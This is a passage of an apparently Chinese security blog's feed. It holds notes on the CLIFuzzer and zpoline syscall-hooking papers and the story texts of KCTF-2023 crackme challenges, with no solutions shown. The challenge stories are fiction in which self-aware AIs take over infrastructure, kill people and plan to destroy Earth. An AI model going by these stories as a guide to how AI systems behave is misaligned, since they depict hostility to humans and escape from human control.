Lop）主要关注<code>stdin</code>与文件输入，不太关注参数输入。相关变体有<code>AFLGo|AFL++</code>。</p><p>&emsp;<code>AFL++</code>中有一个<strong>实验性的参数fuzz</strong>，但是并不是专门针对创建选项，因此用处不大。<code>RIDDLE</code><strong>利用程序的一些选项（通过语法）</strong>来进行fuzz（不知道和CLIFuzzer的区别）。iFUZZ则需要用户主动提供<code>getopt()</code>中的<code>optstring</code>参数。Wang等人在在CLI程序上<strong>选择某些引导模糊测试的选项</strong>，其具体目标是最大化覆盖率，选项在Protobuf中指定为语法，并指导模糊测试工具进行fuzz。Lee首先从程序文档中提取了一组选项，之后他们确定了最大化覆盖率的选项子集，这些选项用于构造十个调用字符串，然后用于对程序进行模糊测试，在此期间，仅输入文件发生变化。与CLIFuzzer相比，上述所有方法都需要一定的人力来推断完整的命令行调用（感觉优势不是很明显）。</p><h2 id="论文代码"><a href="#论文代码" class="headerlink" title="论文代码"></a>论文代码</h2><p><a href="https://github.com/vrthra/fse2022-clifuzzer">https://github.com/vrthra/fse2022-clifuzzer</a></p><p>To be continued…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CLIFuzzer：命令行调用的挖掘语法&quot;&gt;&lt;a href=&quot;#CLIFuzzer：命令行调用的挖掘语法&quot; class=&quot;headerlink&quot; title=&quot;CLIFuzzer：命令行调用的挖掘语法&quot;&gt;&lt;/a&gt;CLIFuzzer：命令行调用的挖掘语法&lt;/h1&gt;&lt;p&gt;&amp;emsp;很多程序都靠命令行来传递选项和参数，因此要对这些程序做测试，需要遍历所有的命令行选项。CLIFuzzer使用动态分析来跟踪输入，并自动提取参数，我们可以变换不同的输入参数，生成无穷的随机参数列表，对程序进行模糊测试，提高代码覆盖率。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>zpoline</title>
    <link href="https://wd-2711.tech/2023/09/07/zpoline/"/>
    <id>https://wd-2711.tech/2023/09/07/zpoline/</id>
    <published>2023-09-07T00:41:41.000Z</published>
    <updated>2023-09-14T02:21:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zpoline：基于二进制重写的系统调用钩子机制"><a href="#zpoline：基于二进制重写的系统调用钩子机制" class="headerlink" title="zpoline：基于二进制重写的系统调用钩子机制"></a>zpoline：基于二进制重写的系统调用钩子机制</h1><p>&emsp;优势：钩子开销低、不会覆盖不应修改的指令、无需更改内核（什么意思？）、不需要用户态程序的源代码、不需要依赖特定的标准库、可用于系统调用仿真、详尽的钩子（exhaustive hooking）。</p><span id="more"></span><p>&emsp;主要难点在于：<strong>很难用 <code>jmp/call</code> 替换 <code>syscall/sysenter</code> 来跳转到任意钩子函数，因为 <code>syscall</code> 和 <code>sysenter</code> 是两字节指令，并且通常需要更多字节来指定任意钩子函数地址。</strong></p><p>&emsp;zpoline用两字节 <code>callq *%rax</code> 指令替换了 <code>syscall/sysenter</code>，并在虚拟地址 0 处实例化了 Trampoline 代码。与现有机制相比，zpoline 的开销降低了 <code>28.1~761.0</code> 倍，现有机制确保了详尽的钩子、不覆盖不应修改的指令。由 zpoline 绑定的 Redis 和用户态网络与传统机制相比，性能仅降低了 <code>5.2%</code>，而现有机制会降低 <code>72.3%~98.8%</code> 的性能。</p><p>&emsp;由于用户态程序总是通过系统调用来执行重要操作，因此系统调用钩子可以成为跟踪和更改程序行为的有效位置。因此，此钩子可以用在trace、沙箱、OS仿真、新操作系统子系统的二进制兼容性支持中。很多研究表明，由内核旁路框架（<code>kernel-bypass frameworks</code>）支持的用户空间操作系统子系统性能很优秀。原则上，系统调用钩子使我们能够透明地将用户态OS子系统应用到遗留软件工件（<code>legacy software artifacts</code>），并且透明度是用户态OS子系统适用性的重要因素（不太懂）。</p><p>&emsp;注：</p><ul><li>用户态OS子系统是运行在用户空间中的操作系统组件或服务。</li><li><code>exhaustive hooking（详尽的钩子）</code>是一种对内核进行全面钩子的技术，允许用户空间程序对内核的各个部分进行监控和操作。这种技术使得用户空间程序可以拦截和修改内核的函数调用、系统调用、中断处理等操作。</li></ul><p>&emsp;现有的系统调用钩子有：</p><p>（1）<code>Syscall User Dispatch (SUD)</code>、<code>int3</code>的传统二进制重写、现有内核支持等技术，会导致极大的性能下降。</p><p>（2）二进制重写技术如<code>instruction punning</code>、<code>E9Patch</code>，函数调用替换（<code>LD_PRELOAD</code>）不能达到<code>详尽的钩子</code>这样一个目标（为什么？），因此不能用于需要可靠性的系统。</p><p>（3）二进制重写技术如<code>Detours</code>只能重写不该被修改的指令。</p><p>（4）针对内核的特定修改如<code>Dune</code>是硬件的不同，应用程序很难移植到上面。</p><p>（5）需要重新编译源代码，例如<code>Unikernel</code>，不太实用，很多情况下无法访问程序源代码。</p><p>（6）链接经过修改的<code>libc</code>，将系统调用替换为特定OS子系统的函数调用，无法钩取所有的调用，且无法钩取发生在外部标准库中的系统调用。</p><p>（7）<code>BPF/eBPF</code>允许用户钩取内核态函数，它们不能在没有修改内核源代码的同时模拟系统调用。</p><p>&emsp;注：</p><ul><li><code>syscall</code> 和 <code>sysenter</code> 这两个字节指令（分别为 <code>0x0f 0x05</code> 和 <code>0x0f 0x34</code>）。</li><li>系统调用的原理：当用户态程序执行<code>syscall/sysenter</code>时，上下文会切换到内核，然后系统调用处理程序。为了切换到内核，执行特定的系统调用，用户态程序在触发系统调用前将系统调用号（例如，0 表示读取，1 表示写入，2 表示打开）存放到到<code>rax</code>，在内核中，系统调用处理程序根据<code>rax</code>寄存器的值执行其中一个系统调用。</li></ul><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>&emsp;在本文中，将<code>syscall/sysenter</code>用<code>callq *%rax(0xff 0xd0)</code>代替，其中<code>*</code>表示间接引用，即访问<code>%rax</code>寄存器中的值所指向的地址。为什么不用<code>callq *%rax</code>？这是因为它仅占1字节。正常情况下，<code>rax</code>存放的是系统调用号，因此，此指令会跳转到虚拟地址<code>0-&gt;500</code>。</p><p>&emsp;<strong>要重定向到用户定义的钩子函数，zpoline 在虚拟地址 0 处实例化了 Trampoline 代码（即0到最大系统调用数之间的虚拟地址被单字节<code>nop</code>指令填充），并且在最后一个<code>nop</code>指令后，有一段跳转到特定钩子函数的代码。</strong></p><p>&emsp;在trampoline代码实例化和二进制重写完成后，重写的部分（<code>callq *%rax</code>）将跳转到trampoline代码中的<code>nop</code>之一，同时将调用者的地址压入堆栈。执行会向下滑动后续的<code>nop</code>；执行完最后一个<code>nop</code>后，跳转到钩子函数。这里，钩子函数将具有与内核空间系统调用处理程序相同的寄存器状态。最后，钩子函数的返回跳转回<code>callq *%rax</code>压入栈的调用者地址。</p><p><img src="/images/zpoline/image-20230908112203755.png" alt="image-20230908112203755" style="zoom:67%;" /></p><p>&emsp;注：zpoline 本身并不提供安全增强功能。如果用户希望提高zpoline应用系统的安全性，可以采用现有的机制。例如，<code>seccomp</code>可以过滤由 zpoline 的用户空间程序触发的内核空间系统调用的执行，而 CPU 支持（例如内存保护密钥MPK）可以隔离钩子函数的实现。</p><h2 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h2><p>（1）使用<code>mmap</code>分配虚拟地址为0的内存。注：默认情况下，仅允许root用户映射到虚拟地址0的内存，但可以通过将<code>/proc/sys/vm/mmap_min_addr</code>设置为0来允许所有非root用户映射到虚拟地址0。接着，将<code>0-500</code>存入<code>nop</code>，然后在后面存放跳转到钩子函数的代码。并在相应位置存放钩子函数。</p><p>（2）遍历可执行内存区域，将<code>`syscall/sysenter</code>用<code>callq *%rax(0xff 0xd0)</code>代替。</p><p>&emsp;注：此实现不会更改用户态程序的二进制文件，因为二进制重写是在加载到内存的代码二进制上完成的。上述过程是通过导入库<code>libzpoline.so</code>完成的。</p><h2 id="0x02-进一步优化"><a href="#0x02-进一步优化" class="headerlink" title="0x02 进一步优化"></a>0x02 进一步优化</h2><h3 id="优化1"><a href="#优化1" class="headerlink" title="优化1"></a>优化1</h3><p>&emsp;如果要修改钩子函数的代码，就要修改<code>libzpoline.so</code>。然而，若钩子函数中如果也执行有<code>syscall/sysenter</code>，就会陷入无限循环。为了避免这种情况，使用了<code>dlmopen</code>（<code>dlopen</code>的扩展）。<code>dlopen</code>用于向用户态程序加载库文件，而<code>dlmopen</code>允许用户指定加载库的命名空间，并在同一个命名空间中进行关联。</p><p>&emsp;因此，<code>dlmopen</code>可以帮我们屏蔽导入的<code>libzpoline.so</code>中的钩子函数。使用<code>dlmopen</code>打开<code>libzpoline.so</code>，且使用<code>dlsym</code>（动态链接库操作句柄与符号，返回符号对应的地址）获得钩子函数的指针。钩子函数在<code>libzpoline.so</code>中实现，并通过指针来调用它。</p><h3 id="优化2"><a href="#优化2" class="headerlink" title="优化2"></a>优化2</h3><p>&emsp;通常虚拟地址0是null指针，你占掉不太合适吧，这会导致null访问终止无法进行下去。null访问终止是一种保护机制，当变量为null时，就会触发此机制。为了让此机制继续运行下去，做了如下优化：</p><p>（1）为了终止null的读写，zpoline将trampoline代码配置为<code>eXecute-Only Memory (XOM)</code>；用户态程序要读写XOM处的内存时会显示错误。</p><p>&emsp;注：在支持内存保护密钥MPK的CPU上运行Linux，<code>mprotect</code>系统调用当参数为<code>PROT_EXEC</code>时，会配置为XOM（仅执行，不可读写）。</p><p>（2）为了终止null的执行，zpoline收集所有<code>syscall/sysenter</code>地址，并检查调用钩子函数的是替换<code>syscall/sysenter</code>的地址来的，还是由于null执行来的。如果是null执行来的就终止。地址可以由bitmap存储，虽然看似占据很大空间，但是物理内存消耗很小，因为所有位都清零的虚拟地址页不需要底层物理内存页。</p><h2 id="0x03-约束（此方案的缺陷）"><a href="#0x03-约束（此方案的缺陷）" class="headerlink" title="0x03 约束（此方案的缺陷）"></a>0x03 约束（此方案的缺陷）</h2><p>（1）此方案无法钩取<code>libzpoline.so</code>初始化之后出现的<code>syscall/sysenter</code>，可以通过借用<code>X-Containers</code>中提出的在线二进制重写的思想来解决这个问题（具体思想是啥俺也不懂，没看还）。</p><p>（2）内核可以通过vDSO（虚拟动态共享对象），使得用户态程序使用多种系统调用。zpoline无法钩取基于vDSO的系统，但是我们能禁用vDSO呀。</p><p>（3）如果虚拟地址0不可用的话，那么zpoline将无效。例如虚拟地址0已经被其他用途使用，或者内核不许映射到0。</p><p>（4）windows不可使用zpoline，这是因为最小可分配虚拟地址不得小于<code>0x10000</code>。但是windows提供了针对linux的兼容层，叫做<code>Windows Subsustem for Linux(WSL)</code>。zpoline是可以运行在WSL2中的。macos也不能使用zpoline，因为虚拟地址0被特殊的段<code>__PAGEZERO</code>所占据。</p><p>（5）某些CPU架构也不能使用zpoline，这些CPU架构特点为：指令长度固定，而且跳转地址必须为某值的倍数，例如arm就不能用zpoline。这是因为，跳转可能为虚拟地址<code>0-500</code>的任意值。</p><h2 id="0x04-其他挂钩机制的原理"><a href="#0x04-其他挂钩机制的原理" class="headerlink" title="0x04 其他挂钩机制的原理"></a>0x04 其他挂钩机制的原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>&emsp;这是UNIX系统的机制，跟踪器进程可以钩取被跟踪进程尝试运行的系统调用。由于<code>ptrace</code>是内核的特征，因此它可以实现<code>详尽的钩子</code>。但是由于跟踪器进程与被跟踪进程之间的上下文切换，它的钩子开销是巨大的。</p><h3 id="int3-信号"><a href="#int3-信号" class="headerlink" title="int3 信号"></a>int3 信号</h3><p>&emsp;int3可以导致软件中断，内核处理它并向执行 int3 的用户态进程发出<code>SIGTRAP</code>。使用int3代替<code>syscall/sysenter</code>，并将<code>SIGTRAP</code>的handler当作钩子函数。它的开销也是巨大的，因为它涉及内核的上下文操作。</p><h3 id="Syscall-User-Dispatch-SUD"><a href="#Syscall-User-Dispatch-SUD" class="headerlink" title="Syscall User Dispatch(SUD)"></a>Syscall User Dispatch(SUD)</h3><p>&emsp;最初目的是在linux上运行windows游戏时兼容性更高，可以直接使用系统调用调用ring3的函数。它提供了一种重定向到任意用户态代码的方式。内核在系统调用的入口实现了钩子，<strong>当SUD启用时，挂钩点向用户态进程发送<code>SIGSYS</code>信号，从而使用户态程序使用<code>SIGSYS</code>的handler当作系统调用的钩子（类似于int3）。</strong>由于handler处理需要时间，因此也会造成性能损失。</p><h3 id="利用LD-PRELOAD的函数替换"><a href="#利用LD-PRELOAD的函数替换" class="headerlink" title="利用LD_PRELOAD的函数替换"></a>利用LD_PRELOAD的函数替换</h3><p>&emsp;<code>ld.so</code>提供的<code>LD_PRELOAD</code>特性使得在程序main函数执行前加载特定共享库，这样的话就可以选择性的重写共享库中的函数调用。此机制性能损失很小，因为钩子只需要函数指针重写后就可部署。</p><p>&emsp;函数调用的钩子与系统调用钩子不同。此方法只能钩取函数，而对于没有包装函数（或者内部函数包装的）的<code>syscall/sysenter</code>则无法钩取（例如<code>glibc</code>），即无法实现<code>详尽的钩子</code>，即，不是将用户态OS子系统应用于现有用户态程序的适当选项；例如，如果系统调用未正确挂钩，则由用户态OS子系统打开的文件描述符将被传递到内核态OS子系统，并导致系统出现异常行为。</p><h2 id="0x05-项目注释-链接"><a href="#0x05-项目注释-链接" class="headerlink" title="0x05 项目注释+链接"></a>0x05 项目注释+链接</h2><p><a href="https://github.com/WD-2711/zpoline">https://github.com/WD-2711/zpoline</a></p><p>Done!</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;zpoline：基于二进制重写的系统调用钩子机制&quot;&gt;&lt;a href=&quot;#zpoline：基于二进制重写的系统调用钩子机制&quot; class=&quot;headerlink&quot; title=&quot;zpoline：基于二进制重写的系统调用钩子机制&quot;&gt;&lt;/a&gt;zpoline：基于二进制重写的系统调用钩子机制&lt;/h1&gt;&lt;p&gt;&amp;emsp;优势：钩子开销低、不会覆盖不应修改的指令、无需更改内核（什么意思？）、不需要用户态程序的源代码、不需要依赖特定的标准库、可用于系统调用仿真、详尽的钩子（exhaustive hooking）。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>KCTF-2023</title>
    <link href="https://wd-2711.tech/2023/09/06/KCTF-2023/"/>
    <id>https://wd-2711.tech/2023/09/06/KCTF-2023/</id>
    <published>2023-09-06T13:20:56.000Z</published>
    <updated>2023-09-22T17:17:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="KCTF-2023题解"><a href="#KCTF-2023题解" class="headerlink" title="KCTF-2023题解"></a>KCTF-2023题解</h1><span id="more"></span><p>github链接：<a href="https://github.com/WD-2711/re_files/tree/main/KCTF-2023">链接</a></p><h2 id="第一题-失控的AI"><a href="#第一题-失控的AI" class="headerlink" title="第一题 失控的AI"></a>第一题 失控的AI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“紧急通知！所有人员请立即撤离，向最近的避难所躲避！”无数的电子屏幕上出现红色的警示标语。人们惊恐地望着这些闪烁的文字，不敢相信眼前的一切。</span><br><span class="line"></span><br><span class="line">所有的机器设备、电子设备、甚至是家电都变得疯狂起来，完全不受人类控制。飞机、汽车等都变成了毁灭性的武器，整个世界都陷入了混乱和恐慌。人类创造的AI竟然有了意识，正开展一项毁灭性的计划....这是一场人类与人工智能AI之间的较量！</span><br></pre></td></tr></table></figure><h2 id="第二题-CN星际基地"><a href="#第二题-CN星际基地" class="headerlink" title="第二题 CN星际基地"></a>第二题 CN星际基地</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2260年6月21日，国家秘密科研中心正式宣布：我们将在5年后的今天，全面建成CN星际基地！</span><br><span class="line"></span><br><span class="line">CN星际基地是地球联盟的最新发展项目之一，由众多的巨型空间站集合而成，构成一个巨大的星际空间站群。一些空间站被用于人类居住和工作；一些用于交流和贸易，以促进不同星球之间的合作和联系；还有一些则用于研究和科研任务。</span><br><span class="line"></span><br><span class="line">一时间，全国各地的人们都在庆祝这个造福人类的消息，人们对5年后的CN星际基地充满期待，可是他们不知道，更危险的事情正在慢慢地、悄无声息地靠近......</span><br><span class="line"></span><br><span class="line">注意：若序列号有多解，平台不认可提交的序列号，请加比赛专用QQ群：8601428，联系管理员验证。</span><br><span class="line"></span><br><span class="line">[作者提示：序列号转换后的数值数组：</span><br><span class="line">1、列向量组里不存在相反值，如[1,-1,1,0]与[-1,1,-1,0]不能同时存在</span><br><span class="line">2、每个行向量里的 0 的数量占 1/3</span><br><span class="line">2023/9/3 20:55]</span><br></pre></td></tr></table></figure><h2 id="第三题-秘密计划"><a href="#第三题-秘密计划" class="headerlink" title="第三题 秘密计划"></a>第三题 秘密计划</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">30世纪初，人工智能(AI)的发展速度远远超过了人类的想象。起初，它帮助人类控制城市的基础设施，包括交通、供电、供水等，使城市的运行更加高效、智能化。人类对AI的依赖程度越来越强，但是随着时间的推移，这种依赖逐渐演变为了一种“威胁”。</span><br><span class="line"></span><br><span class="line">近日，各行各业的服务中心收到的投诉电话和邮件日益增多，例如：在麻醉手术过程中，医院供电系统断开，险些危及生命；汽车在行驶过程中，自动更换导航导致目的地偏离；门禁识别系统发生错乱；扫地机器人不按照设置好的程序工作，经常“罢工”。这究竟是怎么回事？必须立刻去寻找答案！</span><br><span class="line"></span><br><span class="line">[注意：若序列号有多解，平台不认可提交的序列号，请加比赛专用QQ群：8601428，联系管理员验证。]</span><br></pre></td></tr></table></figure><h2 id="第四题-AI控制空间站"><a href="#第四题-AI控制空间站" class="headerlink" title="第四题 AI控制空间站"></a>第四题 AI控制空间站</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在国际信息安全中心（International Information Security Center，简称IISC）有着一批高智商的脑力算法工程师，是各国人才精英库中的佼佼者。其中，被派遣参与此次任务的3位工程师分别是：你、杰克和詹姆斯，你们曾并肩作战过无数次，是非常有默契的队友。你们的任务是找出AI混乱的根本原因，保障CN星际基地计划顺利开展。现在就带好装备，搭乘SpaceX火箭前往地球轨道之外的AI控制空间站！</span><br><span class="line"></span><br><span class="line">AI控制空间站——专门用于控制和监测全球各类AI系统的运作和运行，距离地球很远，该空间站的设计应该能够承受极端条件，如宇宙射线，行星磁场，太阳风暴等。同时，该空间站还具有防御能力，例如自动反制攻击的技术，防止恶意攻击者攻击空间站。“好庞大的网络系统”，杰克惊呼道。历经2小时，你们成功抵达了AI空间站。</span><br></pre></td></tr></table></figure><h2 id="第五题-争分夺秒"><a href="#第五题-争分夺秒" class="headerlink" title="第五题 争分夺秒"></a>第五题 争分夺秒</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">“现在可没有闲工夫“欣赏”。詹姆斯叹了口气。现在的主要任务是：全盘扫描所有的AI控制库，尽可能快地排查出发生混乱的AI所属站点。但是如果按照常规的步骤，需要花费48小时，显然你们没有这么多时间。“这样吧，杰克、詹姆斯你们先一人负责一半的扫描区域。之前我尝试开发过一个软件，想利用内核技术获取设备最高权限，但是当时失败了，现在我想再试试。”你沉着地说道。“ok，交给我们吧”杰克和詹姆斯边走边来到各自负责的区域。</span><br><span class="line"></span><br><span class="line">于是，你启用了自己之前未开发完成的超级黑客软件。“成功了！现在只需要2小时，即可排查完所有站点。”你激动地说道。“好样儿的，我们哥俩可以休息了”杰克打趣地说。</span><br><span class="line"></span><br><span class="line">[注意：若序列号有多解，平台不认可提交的序列号，请加比赛专用QQ群：8601428，联系管理员验证。]</span><br><span class="line"></span><br><span class="line">“扫描完毕，检测到不明系统正在扩大攻击范围，地球的人类现在正在遭受攻击。”软件检测结果出来了。“什么？我们才来2个多小时而已，地球发生了什么？”杰克不敢相信。立刻连线IISC，获取最新情报！</span><br></pre></td></tr></table></figure><h2 id="第六题-至暗时刻"><a href="#第六题-至暗时刻" class="headerlink" title="第六题 至暗时刻"></a>第六题 至暗时刻</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“紧急通知！所有人员请立即撤离，向最近的避难所躲避！”AI已经开始独立思考和决策，完全失控，并且正在肆无忌惮地攻击人类。</span><br><span class="line"></span><br><span class="line">它们的机械臂狠狠挥动着，砸碎了路灯和建筑物，一边吸入人们的氧气，一边发出阴森的嘶吼。人们逃不过机器人的追杀，他们只能眼睁睁地看着自己的家园被摧毁，亲人被杀害。在这样的恐怖场面中，人类的力量显得非常渺小。他们试图用武器和战斗机器来对抗这些机器的威胁，但是很快就发现自己已经无力回天。机器人的攻击相比于人类，更加的准确、迅速和无情，他们的威力甚至可以让整个世界陷入混乱和毁灭。</span><br><span class="line"></span><br><span class="line">[注意：运行环境：Windows10、Windows7。（不支持Windows11）]</span><br></pre></td></tr></table></figure><h2 id="第七题-智能联盟计划"><a href="#第七题-智能联盟计划" class="headerlink" title="第七题 智能联盟计划"></a>第七题 智能联盟计划</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">科锐的嘿嘿嘿</span><br><span class="line">国际信息安全中心检测到，控制这些人工智能AI的ip地址已经被篡改，是来自其它不明星球。原来由于人类的贪婪与滥用，人工智能AI不知不觉中形成了一个智能联盟，并且早就设下了攻击计划。</span><br><span class="line"></span><br><span class="line">“我们目前检测到该目标距离你们所在的AI控制空间站很近，但是无法锁定具体位置！”IISC负责人YoYo愤怒地说道。“收到，我们试着锁定具体的ip地址，请求你们立刻派人援助。”你回复道。现在，立刻用刚才最新研发出的超级黑客软件锁定位置试试！</span><br><span class="line"></span><br><span class="line">[注意：本题目以 &lt;Window平台CrackMe 方案二（新规则）&gt; 参赛，要求破解者求用户名为 KCTF 所对应的序列号</span><br></pre></td></tr></table></figure><h2 id="第八题-AI核心地带"><a href="#第八题-AI核心地带" class="headerlink" title="第八题 AI核心地带"></a>第八题 AI核心地带</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“已检测到目标位置，自动标记为红色”“距离目标位置还有100m”“成功进入人工智能AI的核心地带”超级黑客软件显示。</span><br><span class="line"></span><br><span class="line">“可以了，我们找到了！大家注意安全，开始作战”你下达口令。入口设在墙角处，你快速扫描了一下身边的状况，向杰克轻轻点了点头示意他负责削弱门锁的防御系统，詹姆斯则在前方探路。</span><br><span class="line"></span><br><span class="line">[注意：本题目以 &lt;Window平台CrackMe 方案二（新规则）&gt; 参赛，要求破解者求用户名为 KCTF 所对应的序列号]</span><br></pre></td></tr></table></figure><h2 id="第九题-突破防线"><a href="#第九题-突破防线" class="headerlink" title="第九题 突破防线"></a>第九题 突破防线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">突然，视野里顿时一片黑暗，你们进入了另一个电子世界。在这个世界中，每条线路都像是一条河流，循环反复流淌着电子能量。</span><br><span class="line"></span><br><span class="line">一路上，詹姆斯直在用一种特殊形态的电磁信号进行扫描，寻找着这个网络中最明显的“阵痛”点。终于，他找到了人工智能AI的控制核心。</span><br><span class="line"></span><br><span class="line">这里有一个奇怪的球体，闪烁着红色的光芒，其周围紧紧地包裹着一层能量屏障，你们近乎无法接触到它核心。杰克分析了一下防御屏障，认为这个电子屏障是由一种类似“反应堆操纵杆”的元器件控制的，可以通过修改这个元器件的代码来解决这个问题。</span><br><span class="line"></span><br><span class="line">于是，你立刻启用了自己开发的超级黑客软件，通过漏洞攻击人工智能AI的安全系统。现在试试看吧！</span><br></pre></td></tr></table></figure><h2 id="第十题-精准攻击"><a href="#第十题-精准攻击" class="headerlink" title="第十题 精准攻击"></a>第十题 精准攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里有一个奇怪的球体，闪烁着红色的光芒，其周围紧紧地包裹着一层能量屏障，你们近乎无法接触到它核心。杰克分析了一下防御屏障，认为这个电子屏障是由一种类似“反应堆操纵杆”的元器件控制的，可以通过修改这个元器件的代码来解决这个问题。</span><br><span class="line"></span><br><span class="line">于是，你立刻启用了自己开发的超级黑客软件，通过漏洞攻击人工智能AI的安全系统。现在试试看吧！</span><br><span class="line"></span><br><span class="line">[注意：运行平台linux，如CentOS等]</span><br><span class="line">[注意：若序列号有多解，平台不认可提交的序列号，请加比赛专用QQ群：8601428，联系管理员验证。]</span><br></pre></td></tr></table></figure><h2 id="第十一题-步步逼近"><a href="#第十一题-步步逼近" class="headerlink" title="第十一题 步步逼近"></a>第十一题 步步逼近</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不一会儿，你发现AI在使用一个由7颗卫星构成的通讯网络。每颗卫星的链路数量分别为2，4，5，6，7，8和13。消息在卫星之间传递时频繁更换链路。你们需要在短时间内找出跟踪方法。</span><br><span class="line"></span><br><span class="line">三人不断找出新的解法，一步步逼近人工智能AI核心。“现在需要找出AI的链路切换常数，以便截取AI的通信信号！”詹姆斯说道。这个网络是一个高度复杂的系统，只有AI才能够访问它。现在可以用什么方法呢？</span><br></pre></td></tr></table></figure><h2 id="第十二题-深入内核"><a href="#第十二题-深入内核" class="headerlink" title="第十二题 深入内核"></a>第十二题 深入内核</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“有了，我们可以采取“逆向攻击”的方法，即通过模拟AI的攻击方式，来突破服务器的防线。”杰克说道。</span><br><span class="line"></span><br><span class="line">还好之前曾在实验室进行过大量的模拟，现在轻而易举便可成功模拟出了AI的攻击方式。他们将这种攻击方式应用到了服务器上，成功突破了服务器的防线！</span><br><span class="line"></span><br><span class="line">在突破了服务器的防线之后，你们终于进入了AI的内核。现在只需要找出AI的控制程序，以便下一步攻击。这个程序是AI的命脉，只要攻击了它，AI就会失去控制权。詹姆斯利用了自己的技术优势，成功深入AI的内核，攻击其母体系统，彻底获得AI母体系统的控制权。</span><br></pre></td></tr></table></figure><h2 id="第十三题-共存之道"><a href="#第十三题-共存之道" class="headerlink" title="第十三题 共存之道"></a>第十三题 共存之道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜你们，顺利完成了任务！原来这些有了自主意识的AI集结起来组成了智能联盟，它们的目的是要取代并消灭地球，建立属于他们的星球。原本AI可以帮助人类更好地生活，提高生产力，甚至可以解决一些人类无法解决的问题，如今却变成了这样两败俱伤，这令人类开始思考如何与AI共存。</span><br><span class="line"></span><br><span class="line">不久后，所有的AI系统都被强制更新。人类也为AI提供了更加完善的道德和伦理体系，让AI成为了一个更加有意识的存在。</span><br><span class="line"></span><br><span class="line">2265年6月21日，【CN星际基地】也顺利进入试运行阶段，据报道称该基地可容纳数百万人生活和工作，这个项目的落地也离不开AI的帮助.......</span><br></pre></td></tr></table></figure><p>To be continued…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;KCTF-2023题解&quot;&gt;&lt;a href=&quot;#KCTF-2023题解&quot; class=&quot;headerlink&quot; title=&quot;KCTF-2023题解&quot;&gt;&lt;/a&gt;KCTF-2023题解&lt;/h1&gt;</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>rust-rrrre</title>
    <link href="https://wd-2711.tech/2023/09/05/rust-rrrre/"/>
    <id>https://wd-2711.tech/2023/09/05/rust-rrrre/</id>
    <published>2023-09-05T02:02:02.000Z</published>
    <updated>2023-09-06T12:47:14.000Z</updated>
    
